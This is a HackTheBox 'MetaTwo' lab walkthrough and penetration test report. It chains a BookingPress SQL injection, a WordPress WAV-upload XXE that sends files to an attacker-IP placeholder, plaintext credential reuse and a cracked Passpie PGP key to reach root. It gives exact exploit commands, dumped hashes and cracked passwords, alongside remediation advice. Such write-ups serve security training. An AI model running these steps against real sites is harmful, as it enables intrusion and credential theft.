@@ -1,0 +1,438 @@
+# MetaTwo
+
+**Platform:** HackTheBox
+**OS:** Linux
+**Tags:** BookingPress, CVE-2022-0739, SQLi, WordPress, CVE-2021-29447, XXE, FTP, Passpie, PGP
+**Date:** 2026-10-22
+
+A WordPress site running BookingPress 1.0.10, vulnerable to unauthenticated SQL injection via CVE-2022-0739. The extracted hash cracks to a valid WordPress login. WordPress 5.6.2 on PHP 8 resolves external entities in uploaded WAV file metadata, leaking arbitrary files including wp-config.php with FTP credentials. FTP exposes a mailer directory containing SMTP credentials for jnelson, who reuses them as SSH password. Root comes from a Passpie vault whose PGP master key cracks in seconds.
+
+## 1. Enumeration
+
+```bash
+nmap -sC -sV <TARGET_IP>
+nmap -sC -sV -p- <TARGET_IP>
+```
+
+```
+21/tcp  open  ftp     vsftpd
+22/tcp  open  ssh     OpenSSH 8.4p1 Debian
+80/tcp  open  http    nginx 1.18.0
+```
+
+Port 80 redirects to `metapress.htb`. Added it to `/etc/hosts`. FTP on 21 and SSH on 22 are also open.
+
+VHost fuzzing with ffuf found nothing additional. Gobuster on the web root turned up `/wp-admin`, `/wp-login.php`, and `/events`.
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://metapress.htb/ -H "Host: FUZZ.metapress.htb" -fs <size>
+gobuster dir -u http://metapress.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+```
+
+## 2. WordPress Enumeration
+
+```bash
+wpscan --url http://metapress.htb/ --enumerate
+```
+
+```
+WordPress version 5.6.2
+PHP version: 8.0.24
+Users identified: admin, manager
+[i] No plugins found.
+```
+
+WPScan reports no plugins, which is misleading. Pulling plugin references directly from page source reveals more:
+
+```bash
+curl -s http://metapress.htb/events/ | grep -oE 'wp-content/plugins/[^/]+/[^"'\'' ]*ver=[0-9.]+' | sort -u
+```
+
+```
+wp-content/plugins/bookingpress-appointment-booking/readme.txt?ver=1.0.10
+```
+
+BookingPress 1.0.10 is present and vulnerable to CVE-2022-0739.
+
+## 3. BookingPress SQLi (CVE-2022-0739)
+
+BookingPress prior to 1.0.11 has an unauthenticated SQL injection in its AJAX booking handler. No nonce or authentication is validated before the query is constructed.
+
+```bash
+wget https://raw.githubusercontent.com/viardant/CVE-2022-0739/main/booking-sqlinjector.py
+python3 booking-sqlinjector.py -u http://metapress.htb -nu http://metapress.htb/events/ -v
+```
+
+```
+[*] Getting nonce
+[*] Nonce: <nonce>
+[*] Exploiting SQLi
+[+] admin:$P$BGrGrgf2wToBS79i07Nj9w/55bbFHh.
+[+] manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
+```
+
+Crack the manager hash with john:
+
+```bash
+john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
+
+```
+partylikearockstar (manager)
+```
+
+Login to WordPress at `/wp-login.php` as `manager:partylikearockstar` succeeds.
+
+## 4. WordPress XXE (CVE-2021-29447)
+
+WordPress 5.6.2 running on PHP 8 processes external XML entities embedded in the metadata of uploaded media files. A crafted WAV file with a DOCTYPE entity triggers an outbound HTTP request that serves a malicious XML payload, which in turn causes WordPress to fetch and return an arbitrary local file.
+
+```bash
+git clone https://github.com/Val-Resh/CVE-2021-29447-POC
+python3 CVE-2021-29447.py --url http://metapress.htb --server-ip <ATTACKER_IP> -u manager -p 'partylikearockstar'
+```
+
+The exploit starts a local HTTP server, uploads the WAV, and intercepts the callback. Targeting `/etc/passwd`:
+
+```
+root:x:0:0:root:/root:/bin/bash
+...
+jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
+```
+
+`jnelson` is the only user with a login shell. Targeting `../wp-config.php`:
+
+```php
+define( 'FTP_USER', 'metapress.htb' );
+define( 'FTP_PASS', '<redacted>' );
+define( 'FTP_HOST', 'ftp.metapress.htb' );
+```
+
+FTP credentials obtained from `wp-config.php`.
+
+## 5. FTP to SSH
+
+```bash
+ftp <TARGET_IP>
+```
+
+Login with the credentials from `wp-config.php`. Two directories are present: `blog` and `mailer`. The `mailer` directory contains `send_email.php`:
+
+```bash
+get mailer/send_email.php
+cat send_email.php
+```
+
+```php
+$mail->Host = "mail.metapress.htb";
+$mail->Username = "jnelson@metapress.htb";
+$mail->Password = "<redacted>";
+```
+
+SMTP credentials for `jnelson` are stored in plaintext. SSH with the same password (password reuse):
+
+```bash
+ssh jnelson@<TARGET_IP>
+```
+
+```
+jnelson@meta2:~$ cat user.txt
+redacted
+```
+
+## 6. Privilege Escalation (Passpie)
+
+Standard SUID enumeration finds nothing non-standard:
+
+```bash
+find / -user root -perm /4000 2>/dev/null
+```
+
+Listing the home directory reveals a hidden directory:
+
+```bash
+ls -la ~
+```
+
+```
+drwxr-xr-x  3 jnelson jnelson 4096 Oct 25  2022 .passpie
+```
+
+Passpie is a CLI password manager. The vault contains an encrypted root SSH password:
+
+```bash
+ls -la ~/.passpie/
+cat ~/.passpie/.keys
+ls ~/.passpie/ssh/
+cat ~/.passpie/ssh/root.pass
+```
+
+`.keys` holds the PGP public and private key pair used as the master key. `.passpie/ssh/root.pass` holds the AES-encrypted root password, encrypted under that PGP key. Copy the private key block out of `.keys` and crack it:
+
+```bash
+scp jnelson@<TARGET_IP>:~/.passpie/.keys .
+# Extract the private key block into a separate file, then:
+gpg2john private.key > passpie.hash
+john passpie.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+```
+blink182         (Passpie master passphrase)
+```
+
+Decrypt the root password with the cracked passphrase:
+
+```bash
+passpie copy --to stdout root@ssh
+```
+
+```
+Passphrase: blink182
+<decrypted root password>
+```
+
+```bash
+su root
+```
+
+```
+root@meta2:~# cat root.txt
+redacted
+```
+
+## 7. Flags
+
+- User: `redacted`
+- Root: `redacted`
+
+---
+
+## Penetration Test Report
+
+**Target:** metapress.htb
+**Address:** <TARGET_IP>
+**Assessment type:** External network & web application assessment
+**Assessment date:** 22 October 2026
+**Environment:** HackTheBox laboratory assessment  |  Linux
+**Prepared by:** Ledion Mujaj
+**Reference:** HTB-MT2-01
+
+---
+
+## 1. Executive Summary
+
+Testing of **metapress.htb** identified four findings that together produced full root compromise. The host ran a WordPress installation with the BookingPress plugin at version 1.0.10, which contains an unauthenticated SQL injection vulnerability allowing any remote party to dump password hashes from the database without credentials. The manager hash cracked against a common wordlist and provided WordPress administrative access. WordPress 5.6.2 running on PHP 8 processes XML external entities in uploaded WAV file metadata, allowing an authenticated user with media upload rights to read arbitrary files from the server filesystem. This was used to extract `wp-config.php`, which contained plaintext FTP credentials. FTP access exposed a PHP mailer script storing SMTP credentials for `jnelson` in plaintext; that user reused the same password for SSH. A Passpie vault in jnelson's home directory held the root SSH password encrypted under a PGP key whose passphrase cracked against rockyou in seconds.
+
+**Priority recommendations:**
+
+1. Update BookingPress to 1.0.11 or later immediately. The unauthenticated SQLi requires no credentials and exposes all WordPress user password hashes.
+2. Update WordPress to a current release. PHP 8 XXE in media uploads requires only a subscriber-level upload capability; any authenticated user can read arbitrary server files.
+3. Remove plaintext credentials from FTP-accessible configuration files. SMTP passwords, FTP credentials, and database passwords must not be stored in files retrievable without encryption.
+4. Replace the Passpie master passphrase with a strong, randomly generated value not present in any wordlist.
+
+---
+
+## 2. Assessment Scope and Methodology
+
+| Asset | Address | Description |
+|-------|---------|-------------|
+| metapress.htb | <TARGET_IP> | Debian Linux; WordPress on nginx, FTP on 21, SSH on 22. |
+
+| Port | Service | Observed detail |
+|------|---------|----------------|
+| 21/tcp | FTP | vsftpd; authenticated access with credentials from wp-config.php |
+| 22/tcp | SSH | OpenSSH 8.4p1 Debian |
+| 80/tcp | HTTP | nginx 1.18.0; WordPress 5.6.2 on PHP 8.0.24 |
+
+Testing began with a full port scan. WordPress and plugin versions were enumerated by parsing page source directly, bypassing WPScan's false negative on BookingPress. CVE-2022-0739 was reproduced against the booking AJAX endpoint to extract password hashes. The manager hash was cracked and used to log in. CVE-2021-29447 was reproduced via a crafted WAV upload to read `/etc/passwd` and `wp-config.php`. FTP was accessed with the extracted credentials and the mailer configuration was retrieved. SSH was used with reused SMTP credentials to authenticate as jnelson. Post-login enumeration found a Passpie vault; the PGP private key was extracted and the master passphrase cracked with john, then used to decrypt the root SSH password.
+
+---
+
+## 3. Results Overview
+
+| Reference | Finding | Severity |
+|-----------|---------|----------|
+| F-01 | BookingPress 1.0.10 unauthenticated SQL injection (CVE-2022-0739) | **Critical** |
+| F-02 | WordPress 5.6.2 PHP 8 XXE in media upload (CVE-2021-29447) | **Critical** |
+| F-03 | Plaintext credentials in FTP-accessible configuration files | **High** |
+| F-04 | Weak Passpie master passphrase crackable from rockyou | **High** |
+
+**Compromise sequence:**
+
+| Stage | Action | Access obtained |
+|-------|--------|----------------|
+| 01 | Identified BookingPress 1.0.10 from page source. Reproduced CVE-2022-0739 unauthenticated SQLi to dump WordPress user hashes. Cracked manager hash with john. | WordPress login as manager |
+| 02 | Reproduced CVE-2021-29447 XXE via crafted WAV upload. Read /etc/passwd to identify jnelson; read wp-config.php to extract FTP credentials. | FTP access |
+| 03 | Retrieved send_email.php from FTP mailer directory. Extracted plaintext SMTP credentials for jnelson. Authenticated via SSH with reused password. | SSH shell as jnelson |
+| 04 | Found .passpie vault in jnelson's home. Extracted PGP private key, cracked master passphrase with john. Decrypted root SSH password with passpie. | Root shell |
+
+---
+
+## 4.1 BookingPress Unauthenticated SQL Injection
+
+### F-01   CVE-2022-0739 -- BookingPress 1.0.10 SQLi - CRITICAL
+
+| Field | Detail |
+|-------|--------|
+| Description | BookingPress prior to version 1.0.11 fails to validate or sanitise a parameter passed to an AJAX booking action before constructing a database query. No authentication or nonce validation is performed. Any unauthenticated remote party can send a crafted POST request to the AJAX endpoint and extract arbitrary data from the WordPress database, including password hashes for all registered users. |
+| Prerequisites | Network access to the WordPress site. No prior credentials required. |
+| Impact | All WordPress user password hashes extracted. Hashes cracked offline. WordPress administrative access obtained. |
+| Affected system | metapress.htb -- BookingPress 1.0.10 |
+| CVSS 3.1 | 9.8 -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
+| CWE | CWE-89: Improper Neutralisation of Special Elements used in an SQL Command |
+
+**Steps to reproduce:**
+
+1. Retrieve a nonce from `/events/` page source.
+2. POST to `/wp-admin/admin-ajax.php` with the booking action and injected payload parameter.
+3. Parse the JSON response for extracted hash values.
+
+**Evidence:**
+
+```
+$ python3 booking-sqlinjector.py -u http://metapress.htb -nu http://metapress.htb/events/ -v
+[+] admin:$P$BGrGrgf2wToBS79i07Nj9w/55bbFHh.
+[+] manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
+
+$ john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+partylikearockstar (manager)
+```
+
+**Remediation:** Update BookingPress to version 1.0.11 or later. The vendor patched this issue by adding nonce validation and parameterised queries in that release. If immediate update is not possible, disable the plugin until patched.
+
+**Verification:** Confirm the installed BookingPress version is 1.0.11 or higher. Confirm the AJAX endpoint rejects unauthenticated requests with injected parameters. Rotate all WordPress user passwords.
+
+---
+
+## 4.2 WordPress PHP 8 XXE in Media Upload
+
+### F-02   CVE-2021-29447 -- WordPress 5.6.2 XXE file read - CRITICAL
+
+| Field | Detail |
+|-------|--------|
+| Description | WordPress 5.6.2 running on PHP 8 passes uploaded WAV file metadata through an XML parser that resolves external entities. A crafted WAV file with an embedded DOCTYPE declaration and an external entity reference causes WordPress to make an outbound HTTP request to an attacker-controlled server. The attacker's server responds with a secondary XML payload that reads an arbitrary local file and exfiltrates its contents in a follow-up request. Any user with media upload permissions, including the subscriber and contributor roles, can trigger this. |
+| Prerequisites | Authenticated WordPress account with media upload capability (contributor role or above). |
+| Impact | Arbitrary file read on the server filesystem as the web server user. Used to read wp-config.php and obtain FTP credentials and database credentials. |
+| Affected system | metapress.htb -- WordPress 5.6.2 on PHP 8.0.24 |
+| CVSS 3.1 | 8.8 -- AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
+| CWE | CWE-611: Improper Restriction of XML External Entity Reference |
+
+**Steps to reproduce:**
+
+1. Authenticate as manager (from F-01).
+2. Use the CVE-2021-29447 PoC to craft a WAV file with XXE payload and upload it via the media library.
+3. Receive the callback on the attacker's HTTP server and read the exfiltrated file content.
+
+**Evidence:**
+
+```
+$ python3 CVE-2021-29447.py --url http://metapress.htb --server-ip <ATTACKER_IP> -u manager -p 'partylikearockstar'
+[*] Uploading malicious WAV
+[*] Received callback
+[+] /etc/passwd: root:x:0:0:root:/root:/bin/bash ... jnelson:x:1000:1000:...
+
+[+] ../wp-config.php:
+define( 'FTP_USER', 'metapress.htb' );
+define( 'FTP_PASS', '<redacted>' );
+```
+
+Attacker IP redacted.
+
+**Remediation:** Update WordPress to a release that disables external entity resolution in the media handler, or update PHP to a version where libxml2 external entity loading is disabled by default. As an immediate control, restrict media upload permissions to administrator-only roles.
+
+**Verification:** Confirm the WordPress version has been updated. Confirm a crafted WAV upload no longer triggers an outbound HTTP callback. Confirm `libxml_disable_entity_loader(true)` or equivalent is enforced.
+
+---
+
+## 4.3 Plaintext Credentials in FTP-Accessible Configuration Files
+
+### F-03   send_email.php -- cleartext SMTP credentials - HIGH
+
+| Field | Detail |
+|-------|--------|
+| Description | The FTP share accessible with credentials from `wp-config.php` contained a PHP mailer script at `mailer/send_email.php`. This file stored the SMTP username and password for `jnelson@metapress.htb` in plaintext. The same password was in use for jnelson's SSH account, allowing direct shell access. Additionally, `wp-config.php` itself was readable via the XXE vulnerability and contained the FTP credentials in plaintext. |
+| Prerequisites | FTP access (obtained from wp-config.php via F-02) or filesystem read access via XXE. |
+| Impact | Plaintext SSH credentials obtained for jnelson. Direct SSH authentication to the host. |
+| Affected system | metapress.htb -- FTP share `mailer/send_email.php` |
+| CVSS 3.1 | 7.5 -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
+| CWE | CWE-312: Cleartext Storage of Sensitive Information |
+
+**Steps to reproduce:**
+
+1. Connect to FTP using credentials from `wp-config.php`.
+2. Navigate to `mailer/` and retrieve `send_email.php`.
+3. Read the `$mail->Password` value.
+4. Authenticate to SSH as jnelson with that password.
+
+**Evidence:**
+
+```
+ftp> ls
+mailer/
+blog/
+ftp> get mailer/send_email.php
+
+$mail->Username = "jnelson@metapress.htb";
+$mail->Password = "<redacted>";
+
+$ ssh jnelson@<TARGET_IP>
+jnelson@meta2:~$
+```
+
+**Remediation:** Remove plaintext credentials from all configuration files. Use environment variables or a secrets manager for SMTP and FTP credentials. Ensure PHP configuration files outside the web root are not accessible via FTP. Rotate all credentials stored in the affected files immediately.
+
+**Verification:** Confirm `send_email.php` no longer contains a plaintext password. Confirm jnelson's SSH password has been rotated. Confirm FTP access does not expose configuration files containing credentials.
+
+---
+
+## 4.4 Weak Passpie Master Passphrase
+
+### F-04   .passpie vault -- crackable PGP master key - HIGH
+
+| Field | Detail |
+|-------|--------|
+| Description | jnelson's home directory contained a Passpie password vault at `~/.passpie`. The vault's PGP private key was stored in `~/.passpie/.keys` and readable by jnelson. The master passphrase protecting this key was `blink182`, a common string present in the rockyou wordlist. Cracking the key with `gpg2john` and `john` took seconds. The vault held the encrypted root SSH password, which was decrypted using the cracked passphrase and used to authenticate as root. |
+| Prerequisites | SSH access as jnelson (from F-03). |
+| Impact | Root SSH password decrypted. Full root access to the host. |
+| Affected system | metapress.htb -- `/home/jnelson/.passpie/.keys` |
+| CVSS 3.1 | 7.8 -- AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
+| CWE | CWE-521: Weak Password Requirements |
+
+**Steps to reproduce:**
+
+1. Copy `~/.passpie/.keys` from the target.
+2. Extract the private key block and hash it: `gpg2john private.key > passpie.hash`
+3. Crack with john: `john passpie.hash --wordlist=/usr/share/wordlists/rockyou.txt`
+4. Decrypt root password: `passpie copy --to stdout root@ssh` with passphrase `blink182`.
+5. `su root` with the decrypted password.
+
+**Evidence:**
+
+```
+$ john passpie.hash --wordlist=/usr/share/wordlists/rockyou.txt
+blink182         (key passphrase)
+
+$ passpie copy --to stdout root@ssh
+Passphrase: blink182
+<decrypted password>
+
+root@meta2:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Remediation:** Replace the Passpie master passphrase with a randomly generated passphrase of at least 20 characters not derived from any dictionary word. Consider whether the root password needs to be stored in a vault accessible to a standard user account at all. Rotate the root password immediately.
+
+**Verification:** Confirm the Passpie master passphrase has been changed to a value not crackable from standard wordlists. Confirm the root password has been rotated. Confirm `gpg2john` output from the updated key cannot be cracked with rockyou.
+
+---
+
+## 5. Remediation and Assessment Closeout
+
+| Priority | Action | Reference |
+|----------|--------|-----------|
+| Immediate | Update BookingPress to 1.0.11 or later. Rotate all WordPress user passwords. | F-01 |
+| Immediate | Update WordPress to a patched release. Restrict media upload to administrator roles as interim control. | F-02 |
+| High | Remove plaintext credentials from send_email.php and all FTP-accessible files. Rotate jnelson SSH password and all affected credentials. | F-03 |
+| High | Replace Passpie master passphrase with a strong randomly generated value. Rotate root password. | F-04 |
+
+**Test artefacts:** No persistent artefacts were written to the target beyond normal tool operation.
